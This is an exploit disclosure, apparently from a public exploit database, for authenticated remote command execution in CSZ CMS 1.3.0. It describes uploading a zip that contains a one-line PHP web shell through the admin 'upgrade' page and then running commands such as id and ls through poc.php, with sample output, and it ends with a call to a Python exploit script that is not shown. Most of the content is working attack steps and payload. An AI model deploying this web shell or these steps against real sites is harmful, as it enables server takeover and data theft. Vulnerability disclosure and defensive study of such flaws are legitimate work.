## CSZ CMS Version 1.3.0 Remote Command Execution

**Exploit Title:** CSZ CMS Version 1.3.0 Remote Command Execution  
**Date:** 23/11/2023  
**Exploit Author:** tmrswrr  
**Vendor Homepage:** [https://www.cszcms.com/](https://www.cszcms.com/)  
**Software Link:** [SourceForge](https://www.cszcms.com/link/3#https://sourceforge.net/projects/cszcms/files/latest/download)  
**Version:** 1.3.0  
**Tested on:** [Softaculous CSZ CMS](https://www.softaculous.com/apps/cms/CSZ_CMS)

## Steps to Reproduce:

1. Enter the admin panel and go to this URL: `https://demos1.softaculous.com/CSZ_CMSqwoqwrdkog/admin/upgrade`

2. Create a zip file using the command:
   ```bash
   zip poc.zip poc.php
   <?php echo "<pre>"; system($_REQUEST['cmd']); echo "</pre>"; ?>
   ```
3. Go to System Upgrade Manually and upload the poc.zip file.

4. Execute commands remotely:
   - Test the execution with the `id` command:
     ```
     https://demos1.softaculous.com/CSZ_CMSqwoqwrdkog/poc.php?cmd=id
     ```
     Expected output:
     ```
     uid=1000(soft) gid=1000(soft) groups=1000(soft)
     ```
   - List directory contents using the `ls` command:
     ```
     https://demos1.softaculous.com/CSZ_CMSqwoqwrdkog/poc.php?cmd=ls
     ```
     Expected output:
     ```
     CHANGELOG
     CONTRIBUTING.md
     LICENSE.md
     README.md
     SECURITY.md
     a.php
     assets
     cache.config.inc.php
     config.inc.php
     config_example.inc.php
     corecss.css
     corejs.js
     cszcms
     devtoolsbar.config.inc.php
     env.config.inc.php
     htaccess.config.inc.php
     index.php
     install
     memcached.config.inc.php
     nginx_example.com.conf
     photo
     poc.php
     proxy.inc.php
     redis.config.inc.php
     system
     templates
     test.php
     ```
## Exploit:

```python3 CSZ_CMS.py https://demos1.softaculous.com/CSZ_CMSladcjtgqrm/ id```
